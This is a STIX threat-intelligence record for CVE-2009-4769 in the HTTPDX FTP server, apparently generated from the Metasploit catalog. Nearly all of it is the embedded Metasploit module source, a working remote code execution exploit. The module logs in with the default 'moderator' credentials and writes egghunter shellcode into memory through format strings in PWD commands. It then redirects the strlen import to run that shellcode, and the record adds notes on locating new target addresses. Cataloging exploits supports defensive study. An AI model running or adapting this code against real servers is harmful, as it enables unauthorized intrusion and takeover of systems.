{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77bc6c3e-9c4c-4d3a-9a14-2ae2ce5196b8",
    "created": "2024-08-14T16:51:32.963329Z",
    "modified": "2024-08-14T16:51:32.963334Z",
    "name": "HTTPDX tolog() Function Format String Vulnerability",
    "description": " This module exploits a format string vulnerability in HTTPDX FTP server. By sending a specially crafted FTP command containing format specifiers, an attacker can corrupt memory and execute arbitrary code.  By default logging is off for HTTP, but enabled for the 'moderator' user via FTP. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/httpdx_tolog_format.rb",
            "external_id": "httpdx_tolog_format.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4769"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Egghunter\n  include Msf::Exploit::FormatString\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HTTPDX tolog() Function Format String Vulnerability',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in HTTPDX FTP server.\n        By sending a specially crafted FTP command containing format specifiers, an\n        attacker can corrupt memory and execute arbitrary code.\n\n        By default logging is off for HTTP, but enabled for the 'moderator' user\n        via FTP.\n      },\n      'Author'         =>\n        [\n          'jduck'   # original discovery and metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4769' ],\n          [ 'OSVDB', '60181' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          # format string max length\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x25\",\n          'DisableNops'\t=>  'True',\n          'StackAdjustment' \t=> -1500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #\n          # Automatic targeting via fingerprinting\n          #\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n\n          #\n          # specific targets\n          #\n          [\t'httpdx 1.4 - Windows XP SP3 English',\n            {\n              'NumPops' \t=> 37,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.4.5 - Windows XP SP3 English',\n            {\n              'NumPops' \t=> 37,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.4.6 - Windows XP SP3 English',\n            {\n              'NumPops' \t=> 37,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.4.6b - Windows XP SP3 English',\n            {\n              'NumPops' \t=> 37,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ],\n          [\t'httpdx 1.5 - Windows XP SP3 English',\n            {\n              'NumPops' \t=> 29,\n              'Writable' \t=> 0x64f87810, \t# empty space in core.dll imports\n              'FlowHook'\t=> 0x64f870e8\t\t# core.dll import for strlen\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-11-17'))\n=begin\n\nNOTE: Even though all targets have the same addresses now, future targets may not.\n\nTo find a target:\n\n1. open \"core.dll\" in IDA Pro\n2. navigate to the \"c_wildcmp\" function\n3. follow the xref to the first strlen\n4. follow the xref to the imports area\n5. copy/paste the address\n6. the 'Writable' value should be anything after the last address IDA shows..\n  (preferably something above 0x0d, to avoid bad chars)\n\nIf crashes occur referencing strange values, 'NumPops' probably needs adjusting.\nFor now, that will have to be done manually.\n\n=end\n    register_options(\n      [\n        Opt::RPORT(21),\n        # note the default user/pass\n        OptString.new('FTPUSER', [ true, 'The username to authenticate as', 'moderator'], fallbacks: ['USERNAME']),\n        OptString.new('FTPPASS', [ true, 'The password to authenticate with', 'pass123'], fallbacks: ['PASSWORD'])\n      ])\n  end\n\n\n  def check\n    connect\n    disconnect\n    vprint_status(\"FTP Banner: #{banner}\".strip)\n    if banner =~ /httpdx.*\\(Win32\\)/\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    # Use a copy of the target\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n      connect\n      disconnect\n\n      if (banner and (m = banner.match(/220 httpdx\\/(.*) \\(Win32\\)/))) then\n        print_status(\"FTP Banner: #{banner.strip}\")\n        version = m[1]\n      else\n        print_status(\"No matching target\")\n        return\n      end\n\n      self.targets.each do |t|\n        if (t.name =~ /#{version} - /) then\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        print_status(\"No matching target\")\n        return\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n    end\n\n    # proceed with chosen target...\n    c = connect_login\n    return if not c\n\n    # '<ip>\\n PWD '\n    ip_length = Rex::Socket.source_address(datastore['RHOST']).length\n    num_start = ip_length + 1 + 3 + 1\n\n\n    # use the egghunter!\n    eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })\n\n    # write shellcode to 'writable' (all at once)\n    fmtbuf = generate_fmtstr_from_buf(num_start, mytarget['Writable'], eh_stub, mytarget)\n    print_status(\" payload format string buffer is #{fmtbuf.length} bytes\")\n    if (res = send_cmd(['PWD', fmtbuf ], true))\n      print_status(res.strip)\n    end\n\n\n    # write 'writable' addr to flowhook (execute shellcode)\n    # NOTE: the resulting two writes must be done at the same time\n    fmtbuf = generate_fmt_two_shorts(num_start, mytarget['FlowHook'], mytarget['Writable'], mytarget)\n\n    # add payload to the end\n    fmtbuf << eh_egg\n    print_status(\" hijacker format string buffer is #{fmtbuf.length} bytes\")\n    if (res = send_cmd(['PWD', fmtbuf ], true))\n      print_status(res.strip)\n    end\n\n\n    disconnect\n    handler\n\n    # connect again to trigger shellcode\n    print_status(\" triggering shellcode now\")\n    print_status(\"Please be patient, the egg hunter may take a while...\")\n    connect\n  end\nend\n\n\n=begin\n\nalso present in 1.5 (presumably all versions in between)\n\n1.4/httpdx_src/ftp.cpp:\n\n   544      //printf(out);\n   545      char af[MAX] = {0};\n   546      if(isset(out) && client->serve.log || client->serve.debug)\n   547          snprintf(af,sizeof(af)-1,\"%s\\n%s%s\\n\",client->addr,client->cmd,out);\n   548      if(isset(out) && client->serve.log)\n   549          tolog(client->serve.accessl,af);\n   550      if(isset(out) && client->serve.debug)\n   551          printf(af);\n\n1.4/httpdx_src/http.cpp:\n\n   172      char af[MAX] = {0};\n   173      if(client.serve.log || client.serve.debug)\n   174          snprintf(af,sizeof(af)-1,\"%s [%s] \\\"%s /%s HTTP/1.1\\\" %d\\n\",client.addr,timef,m[client.method-1],client.filereq,response.code);\n   175      if(client.serve.log)\n   176          tolog(client.serve.accessl,af);\n   177      if(client.serve.debug)\n   178          printf(af);\n\n=end\n",
    "x_mitre_disclosure_date": "2009-11-17",
    "x_mitre_platforms": [
        "win'"
    ]
}